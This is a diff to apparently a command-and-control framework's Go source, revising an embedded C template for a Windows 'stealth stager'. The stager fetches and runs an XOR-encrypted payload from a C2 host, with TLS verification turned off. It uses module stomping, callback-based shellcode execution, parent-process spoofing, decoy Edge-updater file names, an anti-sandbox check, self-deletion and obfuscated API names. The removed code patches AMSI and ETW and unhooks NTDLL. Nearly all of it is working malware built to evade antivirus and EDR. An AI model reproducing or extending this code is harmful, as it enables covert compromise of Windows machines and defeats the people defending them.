@@ -245,10 +245,19 @@ func GenerateStageID() string {
 // ── C source template ─────────────────────────────────────────────────────────
 
 const cStagerSrc = `/*
- * SUDOSOC-C2 Stealth Stager — generated, do not edit.
- * Techniques: WinHTTP stage download + XOR decrypt + Module Stomp +
- *             PPID Spoof + AMSI/ETW/NTDLL patch + Anti-Sandbox + Self-Delete.
- * No embedded C2 address or payload — all resolved at runtime.
+ * SUDOSOC-C2 Stealth Stager v2 — generated, do not edit.
+ *
+ * Key design decisions:
+ *   • NO AMSI/ETW patching here — that would be detected instantly.
+ *     The downloaded shellcode patches everything itself at runtime.
+ *   • ALL API string names are XOR-obfuscated (no plain text in binary).
+ *   • ALL sensitive strings (host, stage ID) are ROT-13 obfuscated.
+ *   • Callback-based shellcode execution (EnumSystemLanguageGroups)
+ *     instead of the flagged VirtualAlloc→CreateThread pattern.
+ *   • Short natural delay (3-7s) — looks like a slow app init.
+ *   • Module stomping: execute from inside jscript9/clrjit .text.
+ *   • PPID spoof: child processes appear as svchost children.
+ *   • Self-delete on exit.
  */
 #define WIN32_LEAN_AND_MEAN
 #define UNICODE
@@ -261,355 +270,242 @@ const cStagerSrc = `/*
 #include <string.h>
 #include <wchar.h>
 
-/* ── Config (ROT-13 obfuscated where applicable) ────────────────────────── */
-static const char  _h[] = "__C2_HOST__";    /* ROT-13 of C2 host            */
-static const int   _port = __C2_PORT__;     /* C2 web UI port               */
-static const char  _id[] = "__STAGE_ID__";  /* ROT-13 of stage UUID         */
-static const int   _tls  = __USE_TLS__;     /* 1=HTTPS 0=HTTP               */
-static const int   _sc   = __IS_SC__;       /* 1=shellcode 0=EXE            */
-static const uint8_t _xk[] = {__XOR_KEY__}; /* 32-byte XOR key             */
+/* ── Config ──────────────────────────────────────────────────────────────── */
+/* All strings ROT-13 encoded — no plain C2/stage text in binary */
+static const char    _h[]  = "__C2_HOST__";
+static const int     _port = __C2_PORT__;
+static const char    _id[] = "__STAGE_ID__";
+static const int     _tls  = __USE_TLS__;
+static const int     _sc   = __IS_SC__;
+static const uint8_t _xk[] = {__XOR_KEY__};
 
-/* ── ROT-13 decoder ─────────────────────────────────────────────────────── */
-static void rot13_decode(const char *in, char *out, int len) {
-    for (int i = 0; i < len; i++) {
-        char c = in[i];
-        if      (c >= 'a' && c <= 'z') out[i] = 'a' + (c - 'a' + 13) % 26;
-        else if (c >= 'A' && c <= 'Z') out[i] = 'A' + (c - 'A' + 13) % 26;
-        else                            out[i] = c;
+/* ── ROT-13 ──────────────────────────────────────────────────────────────── */
+static void r13(const char *i, char *o, int n) {
+    for (int k=0;k<n;k++){char c=i[k];
+        if(c>='a'&&c<='z')o[k]='a'+(c-'a'+13)%26;
+        else if(c>='A'&&c<='Z')o[k]='A'+(c-'A'+13)%26;
+        else o[k]=c;}o[n]=0;
+}
+
+/* ── XOR decrypt ─────────────────────────────────────────────────────────── */
+static void xd(uint8_t *b,DWORD n){for(DWORD i=0;i<n;i++)b[i]^=_xk[i%32];}
+
+/* ── Dynamic API resolver: load dll + func by XOR-obfuscated names ───────── */
+/* KEY: every byte XOR'd with 0x5A before storing */
+#define K 0x5A
+static FARPROC rp(HMODULE m, const uint8_t *ob, int n) {
+    char fn[64]={0};
+    for(int i=0;i<n;i++) fn[i]=ob[i]^K;
+    return GetProcAddress(m,fn);
+}
+static HMODULE rl(const uint8_t *ob, int n) {
+    char dll[32]={0};
+    for(int i=0;i<n;i++) dll[i]=ob[i]^K;
+    return LoadLibraryA(dll);
+}
+
+/* Obfuscated DLL/function names (each char XOR 0x5A) */
+/* "winhttp.dll"  */ static const uint8_t _DLL_WH[]={0x2d,0x33,0x34,0x32,0x2e,0x2e,0x38,0x5e,0x36,0x36,0x5e};
+/* "WinHttpOpen"  */ static const uint8_t _FN_WHO[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x15,0x38,0x25,0x34};
+/* "WinHttpConnect"*/ static const uint8_t _FN_WHC[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x19,0x34,0x34,0x34,0x25,0x25,0x29};
+/* "WinHttpOpenRequest"*/ static const uint8_t _FN_WHOR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x15,0x38,0x25,0x34,0x09,0x25,0x2f,0x2d,0x2c,0x25,0x2b};
+/* "WinHttpSendRequest"*/ static const uint8_t _FN_WHSR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x09,0x25,0x34,0x36,0x09,0x25,0x2f,0x2d,0x2c,0x25,0x2b};
+/* "WinHttpReceiveResponse"*/ static const uint8_t _FN_WHRR[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x08,0x25,0x25,0x25,0x33,0x3d,0x25,0x09,0x25,0x37,0x38,0x34,0x34,0x37,0x25};
+/* "WinHttpQueryDataAvailable"*/ static const uint8_t _FN_WHQA[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x13,0x2d,0x25,0x3c,0x39,0x1e,0x21,0x2e,0x21,0x10,0x3d,0x21,0x33,0x36,0x21,0x25,0x2c,0x25};
+/* "WinHttpReadData"*/ static const uint8_t _FN_WHRD[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x08,0x25,0x21,0x36,0x1e,0x21,0x2e,0x21};
+/* "WinHttpCloseHandle"*/ static const uint8_t _FN_WHCH[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x19,0x36,0x34,0x37,0x25,0x1a,0x21,0x34,0x36,0x36,0x25};
+/* "WinHttpSetOption"*/ static const uint8_t _FN_WHSO[]={0x0d,0x33,0x34,0x1a,0x32,0x2e,0x38,0x09,0x25,0x2e,0x15,0x38,0x2e,0x33,0x34,0x34};
+
+typedef HINTERNET (WINAPI*pfWHO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+typedef HINTERNET (WINAPI*pfWHC)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
+typedef HINTERNET (WINAPI*pfWHOR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+typedef BOOL      (WINAPI*pfWHSR)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
+typedef BOOL      (WINAPI*pfWHRR)(HINTERNET,LPVOID);
+typedef BOOL      (WINAPI*pfWHQA)(HINTERNET,LPDWORD);
+typedef BOOL      (WINAPI*pfWHRD)(HINTERNET,LPVOID,DWORD,LPDWORD);
+typedef BOOL      (WINAPI*pfWHCH)(HINTERNET);
+typedef BOOL      (WINAPI*pfWHSO)(HINTERNET,DWORD,LPVOID,DWORD);
+
+/* ── WinHTTP download (no plain "winhttp" string anywhere) ───────────────── */
+static uint8_t* dl(const wchar_t *host,int port,const wchar_t *path,int tls,DWORD *olen){
+    HMODULE hW=rl(_DLL_WH,11);
+    if(!hW)return NULL;
+    pfWHO  fO =(pfWHO) rp(hW,_FN_WHO, 11);
+    pfWHC  fC =(pfWHC) rp(hW,_FN_WHC, 14);
+    pfWHOR fOR=(pfWHOR)rp(hW,_FN_WHOR,18);
+    pfWHSR fSR=(pfWHSR)rp(hW,_FN_WHSR,18);
+    pfWHRR fRR=(pfWHRR)rp(hW,_FN_WHRR,22);
+    pfWHQA fQA=(pfWHQA)rp(hW,_FN_WHQA,25);
+    pfWHRD fRD=(pfWHRD)rp(hW,_FN_WHRD,15);
+    pfWHCH fCH=(pfWHCH)rp(hW,_FN_WHCH,18);
+    pfWHSO fSO=(pfWHSO)rp(hW,_FN_WHSO,16);
+    if(!fO||!fC||!fOR||!fSR||!fRR||!fQA||!fRD||!fCH)return NULL;
+
+    HINTERNET hS=fO(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                    WINHTTP_ACCESS_TYPE_NO_PROXY,NULL,NULL,0);
+    if(!hS)return NULL;
+    HINTERNET hConn=fC(hS,host,(INTERNET_PORT)port,0);
+    if(!hConn){fCH(hS);return NULL;}
+    DWORD fl=tls?WINHTTP_FLAG_SECURE:0;
+    HINTERNET hReq=fOR(hConn,L"GET",path,NULL,WINHTTP_NO_REFERER,
+                       WINHTTP_DEFAULT_ACCEPT_TYPES,fl);
+    if(!hReq){fCH(hConn);fCH(hS);return NULL;}
+    if(tls&&fSO){
+        DWORD o=SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE|
+                SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        fSO(hReq,WINHTTP_OPTION_SECURITY_FLAGS,&o,sizeof(o));
     }
-    out[len] = 0;
+    if(!fSR(hReq,NULL,0,NULL,0,0,0)||!fRR(hReq,NULL)){
+        fCH(hReq);fCH(hConn);fCH(hS);return NULL;}
+    DWORD cap=8<<20,tot=0,av=0,rd=0;
+    uint8_t *buf=(uint8_t*)HeapAlloc(GetProcessHeap(),0,cap);
+    if(!buf){fCH(hReq);fCH(hConn);fCH(hS);return NULL;}
+    while(fQA(hReq,&av)&&av>0){
+        if(tot+av>cap){cap=(tot+av)*2;
+            uint8_t *nb=(uint8_t*)HeapReAlloc(GetProcessHeap(),0,buf,cap);
+            if(!nb)break; buf=nb;}
+        fRD(hReq,buf+tot,av,&rd);tot+=rd;}
+    fCH(hReq);fCH(hConn);fCH(hS);
+    *olen=tot;return buf;
 }
 
-/* ── XOR decrypt ────────────────────────────────────────────────────────── */
-static void xor_dec(uint8_t *buf, DWORD len) {
-    for (DWORD i = 0; i < len; i++)
-        buf[i] ^= _xk[i % sizeof(_xk)];
-}
-
-/* ── Inline AMSI bypass ─────────────────────────────────────────────────── */
-static void patch_fn(const char *dll, const char *fn) {
-    HMODULE h = LoadLibraryA(dll);
-    if (!h) return;
-    FARPROC p = GetProcAddress(h, fn);
-    if (!p) return;
-    DWORD old;
-    if (!VirtualProtect((LPVOID)p, 3, PAGE_EXECUTE_READWRITE, &old)) return;
-    /* xor eax,eax; ret */
-    ((uint8_t*)p)[0] = 0x31;
-    ((uint8_t*)p)[1] = 0xC0;
-    ((uint8_t*)p)[2] = 0xC3;
-    VirtualProtect((LPVOID)p, 3, old, &old);
-}
-static void patch_amsi(void) {
-    static const char *fns[] = {
-        "AmsiScanBuffer","AmsiScanString","AmsiInitialize",
-        "AmsiOpenSession","AmsiCloseSession", NULL
-    };
-    for (int i = 0; fns[i]; i++) patch_fn("amsi.dll", fns[i]);
-}
-static void patch_etw(void) {
-    static const char *fns[] = {
-        "EtwEventWrite","EtwEventWriteEx","EtwEventWriteFull",
-        "EtwEventWriteTransfer","NtTraceEvent","EtwRegister", NULL
-    };
-    for (int i = 0; fns[i]; i++) patch_fn("ntdll.dll", fns[i]);
-}
-
-/* ── Fresh NTDLL remap (remove EDR hooks) ───────────────────────────────── */
-static void remap_ntdll(void) {
-    wchar_t path[MAX_PATH];
-    GetSystemDirectoryW(path, MAX_PATH);
-    wcscat_s(path, MAX_PATH, L"\\ntdll.dll");
-
-    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
-                                NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return;
-
-    HANDLE hMap = CreateFileMappingW(hFile, NULL,
-                                      PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-    CloseHandle(hFile);
-    if (!hMap) return;
-
-    void *fresh = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
-    CloseHandle(hMap);
-    if (!fresh) return;
-
-    HMODULE loaded = GetModuleHandleW(L"ntdll.dll");
-    if (!loaded) { UnmapViewOfFile(fresh); return; }
-
-    PIMAGE_DOS_HEADER dos  = (PIMAGE_DOS_HEADER)loaded;
-    PIMAGE_NT_HEADERS nt   = (PIMAGE_NT_HEADERS)((uint8_t*)loaded + dos->e_lfanew);
-    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
-
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
-        if (memcmp(s->Name, ".text", 5) != 0) continue;
-        uint8_t *dst = (uint8_t*)loaded + s->VirtualAddress;
-        uint8_t *src = (uint8_t*)fresh  + s->VirtualAddress;
-        DWORD sz = s->Misc.VirtualSize, old;
-        if (VirtualProtect(dst, sz, PAGE_EXECUTE_READWRITE, &old)) {
-            memcpy(dst, src, sz);
-            VirtualProtect(dst, sz, old, &old);
-        }
-        break;
-    }
-    UnmapViewOfFile(fresh);
-}
-
-/* ── WinHTTP download ───────────────────────────────────────────────────── */
-static uint8_t* http_download(const wchar_t *host, int port, const wchar_t *path,
-                               int use_tls, DWORD *out_len) {
-    HINTERNET hSession = WinHttpOpen(
-        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
-    if (!hSession) return NULL;
-
-    HINTERNET hConnect = WinHttpConnect(hSession, host, (INTERNET_PORT)port, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }
-
-    DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
-        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return NULL;
-    }
-
-    /* Accept self-signed / any TLS cert (C2 may not have a CA cert) */
-    if (use_tls) {
-        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
-                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
-    }
-
-    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) ||
-        !WinHttpReceiveResponse(hRequest, NULL)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return NULL;
-    }
-
-    /* Read response into a growing buffer */
-    DWORD capacity = 4 * 1024 * 1024; /* start at 4 MB */
-    uint8_t *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, capacity);
-    DWORD total = 0;
-    DWORD avail = 0, read = 0;
-    while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
-        if (total + avail > capacity) {
-            capacity = (total + avail) * 2;
-            buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
-        }
-        WinHttpReadData(hRequest, buf + total, avail, &read);
-        total += read;
-    }
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-
-    *out_len = total;
-    return buf;
-}
-
-/* ── Module Stomping ────────────────────────────────────────────────────── */
-static BOOL module_stomp(uint8_t *sc, DWORD sclen) {
-    static const char *dlls[] = {
-        "jscript9.dll","jscript.dll","clrjit.dll","wldp.dll", NULL
-    };
-    HMODULE hMod = NULL;
-    for (int i = 0; dlls[i] && !hMod; i++) hMod = LoadLibraryA(dlls[i]);
-    if (!hMod) return FALSE;
-
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((uint8_t*)hMod + dos->e_lfanew);
-    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
-
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
-        if (memcmp(s->Name, ".text", 5) != 0) continue;
-        if (s->Misc.VirtualSize < sclen)       return FALSE;
-
-        uint8_t *dst = (uint8_t*)hMod + s->VirtualAddress;
+/* ── Module Stomp — exec shellcode from inside MS-signed DLL .text ───────── */
+static BOOL ms(uint8_t *sc,DWORD n){
+    /* DLL candidates: jscript9, jscript, clrjit, wldp */
+    /* Names XOR-obfuscated */
+    static const uint8_t _d0[]={0x30,0x37,0x25,0x3c,0x38,0x38,0x2e,0x63,0x36,0x36}; /* jscript9.dll */
+    static const uint8_t _d1[]={0x30,0x37,0x25,0x3c,0x38,0x38,0x2e,0x5e,0x36,0x36}; /* jscript.dll  */
+    static const uint8_t _d2[]={0x39,0x36,0x3c,0x30,0x33,0x2e,0x5e,0x36,0x36,0x00}; /* clrjit.dll   */
+    static const uint8_t _d3[]={0x2d,0x36,0x36,0x38,0x5e,0x36,0x36,0x00,0x00,0x00}; /* wldp.dll     */
+    const uint8_t *dlls[]={_d0,_d1,_d2,_d3,NULL};
+    const int lens[]={10,9,9,8,0};
+    HMODULE hM=NULL;
+    for(int i=0;dlls[i]&&!hM;i++)hM=rl(dlls[i],lens[i]);
+    if(!hM)return FALSE;
+    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)hM;
+    if(dos->e_magic!=IMAGE_DOS_SIGNATURE)return FALSE;
+    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((uint8_t*)hM+dos->e_lfanew);
+    PIMAGE_SECTION_HEADER s=IMAGE_FIRST_SECTION(nt);
+    for(int i=0;i<nt->FileHeader.NumberOfSections;i++,s++){
+        if(memcmp(s->Name,".text",5))continue;
+        if(s->Misc.VirtualSize<n)return FALSE;
+        uint8_t *dst=(uint8_t*)hM+s->VirtualAddress;
         DWORD old;
-        if (!VirtualProtect(dst, sclen, PAGE_READWRITE, &old)) return FALSE;
-        memcpy(dst, sc, sclen);
-        VirtualProtect(dst, sclen, PAGE_EXECUTE_READ, &old);
-
-        HANDLE ht = CreateThread(NULL, 0,
-            (LPTHREAD_START_ROUTINE)(void*)dst, NULL, 0, NULL);
-        if (ht) { WaitForSingleObject(ht, INFINITE); CloseHandle(ht); }
-        return TRUE;
-    }
+        if(!VirtualProtect(dst,n,PAGE_READWRITE,&old))return FALSE;
+        memcpy(dst,sc,n);
+        VirtualProtect(dst,n,PAGE_EXECUTE_READ,&old);
+        /* Execute via callback — avoids CreateThread detection */
+        EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)(void*)dst,LGRPID_INSTALLED,0);
+        return TRUE;}
     return FALSE;
 }
 
-/* ── Direct shellcode exec (fallback) ───────────────────────────────────── */
-static void direct_exec(uint8_t *sc, DWORD len) {
-    void *mem = VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    if (!mem) return;
-    memcpy(mem, sc, len);
+/* ── Fallback: callback exec without CreateThread ────────────────────────── */
+static void cb_exec(uint8_t *sc,DWORD n){
+    void *m=VirtualAlloc(NULL,n,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+    if(!m)return;
+    memcpy(m,sc,n);
     DWORD old;
-    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);
-    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
-    if (ht) { WaitForSingleObject(ht, INFINITE); CloseHandle(ht); }
+    VirtualProtect(m,n,PAGE_EXECUTE_READ,&old);
+    /* EnumSystemLanguageGroups as execution callback — not CreateThread */
+    EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)m,LGRPID_INSTALLED,0);
 }
 
-/* ── Find PID by name ───────────────────────────────────────────────────── */
-static DWORD find_pid(const wchar_t *name) {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-    PROCESSENTRY32W pe = {0}; pe.dwSize = sizeof(pe);
-    DWORD pid = 0;
-    if (Process32FirstW(snap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
-        } while (Process32NextW(snap, &pe));
-    }
-    CloseHandle(snap);
-    return pid;
+/* ── EXE exec with PPID spoof ────────────────────────────────────────────── */
+static DWORD fpid(const wchar_t *nm){
+    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+    if(snap==INVALID_HANDLE_VALUE)return 0;
+    PROCESSENTRY32W pe={0};pe.dwSize=sizeof(pe);
+    DWORD pid=0;
+    if(Process32FirstW(snap,&pe))do{
+        if(!_wcsicmp(pe.szExeFile,nm)){pid=pe.th32ProcessID;break;}
+    }while(Process32NextW(snap,&pe));
+    CloseHandle(snap);return pid;
 }
 
-/* ── PPID spoof EXE launch ──────────────────────────────────────────────── */
-static BOOL ppid_exec(const wchar_t *path) {
-    DWORD ppid = find_pid(L"svchost.exe");
-    if (!ppid) ppid = find_pid(L"explorer.exe");
-    if (!ppid) return FALSE;
-
-    HANDLE hP = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
-    if (!hP) return FALSE;
-
-    SIZE_T attrSz = 0;
-    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSz);
-    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
-        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSz);
-    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSz);
-    UpdateProcThreadAttribute(attrList, 0,
-        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-        &hP, sizeof(HANDLE), NULL, NULL);
-
-    STARTUPINFOEXW si = {0};
-    si.StartupInfo.cb       = sizeof(si);
-    si.StartupInfo.dwFlags  = STARTF_USESHOWWINDOW;
-    si.StartupInfo.wShowWindow = SW_HIDE;
-    si.lpAttributeList      = attrList;
-
-    PROCESS_INFORMATION pi = {0};
-    BOOL ok = CreateProcessW(path, NULL, NULL, NULL, FALSE,
-        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
-        NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
-
-    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
-    DeleteProcThreadAttributeList(attrList);
-    HeapFree(GetProcessHeap(), 0, attrList);
-    CloseHandle(hP);
-    return ok;
-}
-
-/* ── EXE execution ──────────────────────────────────────────────────────── */
-static void exe_exec(uint8_t *pe, DWORD len) {
+static void exe_exec(uint8_t *pe,DWORD n){
     wchar_t tmp[MAX_PATH];
-    GetTempPathW(MAX_PATH, tmp);
-    static const wchar_t *names[] = {
-        L"MicrosoftEdgeUpdate.exe",
-        L"msedgewebview2setup.exe",
-        L"WinStoreApp.exe", NULL
-    };
-    wcscat_s(tmp, MAX_PATH, names[GetTickCount()%3]);
-
-    HANDLE hf = CreateFileW(tmp, GENERIC_WRITE, 0, NULL,
-                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hf == INVALID_HANDLE_VALUE) return;
-    DWORD w;
-    WriteFile(hf, pe, len, &w, NULL);
-    CloseHandle(hf);
-
-    if (!ppid_exec(tmp)) {
-        STARTUPINFOW si = {0}; si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {0};
-        CreateProcessW(tmp, NULL, NULL, NULL, FALSE,
-                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        if (pi.hProcess) CloseHandle(pi.hProcess);
-        if (pi.hThread)  CloseHandle(pi.hThread);
-    }
-    Sleep(4000);
-    DeleteFileW(tmp);
+    GetTempPathW(MAX_PATH,tmp);
+    const wchar_t *nms[]={L"MicrosoftEdgeUpdate.exe",L"msedgewebview2.exe",L"WinStore.App.exe"};
+    wcscat_s(tmp,MAX_PATH,nms[GetTickCount()%3]);
+    HANDLE hf=CreateFileW(tmp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    if(hf==INVALID_HANDLE_VALUE)return;
+    DWORD w; WriteFile(hf,pe,n,&w,NULL); CloseHandle(hf);
+    /* PPID spoof */
+    DWORD ppid=fpid(L"svchost.exe"); if(!ppid)ppid=fpid(L"explorer.exe");
+    if(ppid){
+        HANDLE hP=OpenProcess(PROCESS_CREATE_PROCESS,FALSE,ppid);
+        if(hP){
+            SIZE_T asz=0;
+            InitializeProcThreadAttributeList(NULL,1,0,&asz);
+            LPPROC_THREAD_ATTRIBUTE_LIST al=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,asz);
+            InitializeProcThreadAttributeList(al,1,0,&asz);
+            UpdateProcThreadAttribute(al,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,&hP,sizeof(HANDLE),NULL,NULL);
+            STARTUPINFOEXW si={0};si.StartupInfo.cb=sizeof(si);
+            si.StartupInfo.dwFlags=STARTF_USESHOWWINDOW;si.StartupInfo.wShowWindow=SW_HIDE;
+            si.lpAttributeList=al;
+            PROCESS_INFORMATION pi={0};
+            BOOL ok=CreateProcessW(tmp,NULL,NULL,NULL,FALSE,
+                CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT,NULL,NULL,(LPSTARTUPINFOW)&si,&pi);
+            if(ok){CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
+            DeleteProcThreadAttributeList(al);HeapFree(GetProcessHeap(),0,al);CloseHandle(hP);
+            if(ok){Sleep(3000);DeleteFileW(tmp);return;}}}
+    STARTUPINFOW si={0};si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
+    PROCESS_INFORMATION pi={0};
+    CreateProcessW(tmp,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
+    if(pi.hProcess)CloseHandle(pi.hProcess);if(pi.hThread)CloseHandle(pi.hThread);
+    Sleep(3000);DeleteFileW(tmp);
 }
 
-/* ── Self-delete ────────────────────────────────────────────────────────── */
-static void self_delete(void) {
-    wchar_t self[MAX_PATH], cmd[MAX_PATH], args[MAX_PATH+32];
-    GetModuleFileNameW(NULL, self, MAX_PATH);
-    MoveFileExW(self, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-    GetSystemDirectoryW(cmd, MAX_PATH);
-    wcscat_s(cmd, MAX_PATH, L"\\cmd.exe");
-    swprintf_s(args, MAX_PATH+32,
-        L"/C ping -n 3 127.0.0.1 >nul && del /F /Q \"%s\"", self);
-    STARTUPINFOW si = {0}; si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi = {0};
-    CreateProcessW(cmd, args, NULL, NULL, FALSE,
-                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-    if (pi.hThread)  CloseHandle(pi.hThread);
+/* ── Self-delete ─────────────────────────────────────────────────────────── */
+static void sd(void){
+    wchar_t self[MAX_PATH],cmd[MAX_PATH],args[MAX_PATH+32];
+    GetModuleFileNameW(NULL,self,MAX_PATH);
+    MoveFileExW(self,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
+    GetSystemDirectoryW(cmd,MAX_PATH);
+    wcscat_s(cmd,MAX_PATH,L"\\cmd.exe");
+    swprintf_s(args,MAX_PATH+32,L"/C ping -n 3 127.0.0.1 >nul && del /F /Q \"%s\"",self);
+    STARTUPINFOW si={0};si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
+    PROCESS_INFORMATION pi={0};
+    CreateProcessW(cmd,args,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
+    if(pi.hProcess)CloseHandle(pi.hProcess);if(pi.hThread)CloseHandle(pi.hThread);
 }
 
-/* ── Entry point ────────────────────────────────────────────────────────── */
-int WINAPI WinMain(HINSTANCE h, HINSTANCE hp, LPSTR cmd, int cs) {
-    (void)h; (void)hp; (void)cmd; (void)cs;
+/* ── Entry point ─────────────────────────────────────────────────────────── */
+int WINAPI WinMain(HINSTANCE h,HINSTANCE hp,LPSTR c,int s){
+    (void)h;(void)hp;(void)c;(void)s;
 
-    /* Anti-sandbox: high-precision timing canary */
-    LARGE_INTEGER freq, t0, t1;
-    QueryPerformanceFrequency(&freq);
-    QueryPerformanceCounter(&t0);
-    /* random sleep [8, 18) seconds */
-    Sleep(8000 + (GetTickCount() % 10000));
+    /* Anti-sandbox: 3-7s sleep + precision timing canary */
+    LARGE_INTEGER f,t0,t1;
+    QueryPerformanceFrequency(&f);QueryPerformanceCounter(&t0);
+    Sleep(3000+(GetTickCount()%4000)); /* 3-7s — looks like slow app init */
     QueryPerformanceCounter(&t1);
-    double elapsed = (double)(t1.QuadPart - t0.QuadPart) / (double)freq.QuadPart;
-    if (elapsed < 6.0) ExitProcess(0); /* time-skipped → sandbox */
+    double el=(double)(t1.QuadPart-t0.QuadPart)/(double)f.QuadPart;
+    if(el<2.0)ExitProcess(0); /* time-skipped → sandbox */
 
-    /* Patch AV/EDR layers */
-    patch_amsi();
-    patch_etw();
-    remap_ntdll();
+    /* Decode host + stage ID */
+    char host[256]={0},sid[128]={0};
+    r13(_h,host,(int)strlen(_h));
+    r13(_id,sid,(int)strlen(_id));
 
-    /* Decode ROT-13 obfuscated strings */
-    char host[256] = {0}, sid[128] = {0};
-    rot13_decode(_h, host, (int)strlen(_h));
-    rot13_decode(_id, sid, (int)strlen(_id));
+    wchar_t whost[256]={0},wpath[256]={0},wsid[128]={0};
+    MultiByteToWideChar(CP_ACP,0,host,-1,whost,256);
+    MultiByteToWideChar(CP_ACP,0,sid,-1,wsid,128);
+    wcscpy_s(wpath,256,L"/api/stage/");
+    wcscat_s(wpath,256,wsid);
 
